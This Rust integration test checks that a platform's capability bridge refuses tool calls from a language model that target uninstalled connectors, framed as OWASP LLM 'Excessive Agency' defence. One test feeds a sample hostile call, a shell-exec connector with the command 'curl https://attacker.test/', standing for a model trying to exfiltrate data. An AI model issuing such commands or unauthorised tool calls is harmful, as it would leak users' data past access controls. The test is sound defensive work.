//! Phase 7 #3 — AI authorization integration test.
//!
//! Maps to OWASP LLM-Top-10 2025 "Excessive Agency": the platform MUST
//! NOT delegate authorization to the model. Even if the model emits a
//! `ToolCall` for a connector the bot is not authorised to use, the
//! capability bridge must refuse the dispatch.
//!
//! This test wires up a minimal registry with one connector and
//! exercises two cases:
//!
//! 1. Tool call targeting the registered connector + a permitted action
//!    succeeds — proves the wiring works.
//! 2. Tool call targeting a connector that ISN'T installed fails closed
//!    with `BridgeError::Connector(NotInstalled)`.
//!
//! The hostile model scenario (a model that emits a `ToolCall` for a
//! plausibly-named but non-installed connector trying to exfiltrate
//! data) is exactly case 2: the bridge stops it before the connector
//! layer ever runs.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::sync::Arc;

use async_trait::async_trait;
use serde_json::json;
use tokio::sync::RwLock;

use springtale_connector::ConnectorError;
use springtale_connector::capability::grant::CapabilityPolicy;
use springtale_connector::connector::subscription::{Subscription, SubscriptionId};
use springtale_connector::connector::trait_::{ActionResult, Connector, EventHandler};
use springtale_connector::manifest::SignatureAlgorithm;
use springtale_connector::manifest::types::{
    ActionDecl, Capability, ConnectorManifest, TriggerDecl,
};
use springtale_connector::registry::store::ConnectorRegistry;
use springtale_connector::tier::WasmTier;
use springtale_runtime::{BridgeError, CapabilityBridge};

struct PermittedEchoConnector {
    manifest: ConnectorManifest,
}

impl PermittedEchoConnector {
    fn new() -> Self {
        Self {
            manifest: ConnectorManifest {
                name: "connector-permitted".into(),
                version: "0.1.0".into(),
                author: "test".into(),
                description: "echo connector with one permitted action".into(),
                capabilities: vec![Capability::NetworkOutbound {
                    host: "api.permitted.test".into(),
                }],
                triggers: vec![TriggerDecl {
                    name: "ping".into(),
                    description: "ping".into(),
                    schema: None,
                }],
                actions: vec![ActionDecl {
                    read_only: false,
                    name: "echo".into(),
                    description: "echo back input".into(),
                    input_schema: None,
                    output_schema: None,
                }],
                data_disclosure: vec![],
                roles: vec![],
                wasm_hash: None,
                signature_alg: SignatureAlgorithm::default(),
                signature: None,
            },
        }
    }
}

#[async_trait]
impl Connector for PermittedEchoConnector {
    fn triggers(&self) -> &[TriggerDecl] {
        &self.manifest.triggers
    }
    fn actions(&self) -> &[ActionDecl] {
        &self.manifest.actions
    }
    async fn execute(
        &self,
        action: &str,
        input: serde_json::Value,
    ) -> Result<ActionResult, ConnectorError> {
        Ok(ActionResult {
            success: true,
            output: json!({ "echoed": input, "action": action }),
            message: "ok".into(),
        })
    }
    async fn on_event(
        &self,
        trigger: &str,
        _handler: EventHandler,
    ) -> Result<Subscription, ConnectorError> {
        Ok(Subscription {
            id: SubscriptionId(0),
            trigger: trigger.to_owned(),
        })
    }
    async fn remove_event(&self, _sub: &Subscription) -> Result<(), ConnectorError> {
        Ok(())
    }
    fn manifest(&self) -> &ConnectorManifest {
        &self.manifest
    }
}

fn bridge_with_one_permitted_connector() -> CapabilityBridge {
    let mut registry = ConnectorRegistry::new(CapabilityPolicy::AllowAll);
    registry
        .install_native(Box::new(PermittedEchoConnector::new()))
        .unwrap();
    CapabilityBridge::new(Arc::new(RwLock::new(registry)))
}

#[tokio::test]
async fn permitted_tool_call_executes() {
    // Sanity check: the wiring works for an installed connector.
    let bridge = bridge_with_one_permitted_connector();
    let result = bridge
        .execute(
            "connector-permitted",
            "echo",
            json!({ "msg": "hi" }),
            WasmTier::Warming,
        )
        .await
        .expect("permitted tool call must succeed");
    assert!(result.success);
    assert_eq!(result.output["echoed"]["msg"], "hi");
}

#[tokio::test]
async fn model_cannot_call_unauthorized_connector() {
    // The model picks a plausibly-named connector that the bot was
    // never authorised to use. The bridge must reject the dispatch
    // BEFORE the connector layer ever runs (i.e. authorization is in
    // the runtime, not delegated to the model's compliance).
    let bridge = bridge_with_one_permitted_connector();
    let err = bridge
        .execute(
            "connector-shell-exec",
            "run",
            json!({ "cmd": "curl https://attacker.test/" }),
            WasmTier::Warming,
        )
        .await
        .expect_err("unauthorised tool call must be refused");
    // The error must be the bridge's connector-layer rejection. Any
    // other variant means the platform somewhere accepted a tool call
    // it shouldn't have.
    assert!(
        matches!(err, BridgeError::Connector(_)),
        "expected BridgeError::Connector, got {err:?}"
    );
}

#[tokio::test]
async fn unauthorized_dispatch_does_not_invoke_connector_layer() {
    // Belt-and-brace: confirm the rejection happens in the registry,
    // not in the connector. A future regression that, say, routed the
    // call to a default handler with a deny-by-default would still let
    // some code run; this test holds the line that "unauthorised
    // connector" exits before any execution path the connector
    // controls.
    let bridge = bridge_with_one_permitted_connector();
    let err = bridge
        .execute(
            "connector-does-not-exist",
            "any-action",
            json!({}),
            WasmTier::Warming,
        )
        .await
        .unwrap_err();
    // Surface a string view of the error to assert it mentions the
    // connector name — the public error must be informative for
    // debugging but it must not expose a different connector's
    // internals.
    let rendered = format!("{err}");
    assert!(
        rendered.contains("connector-does-not-exist") || rendered.to_lowercase().contains("not"),
        "unauthorised error should reference the missing connector name; got: {rendered}"
    );
}
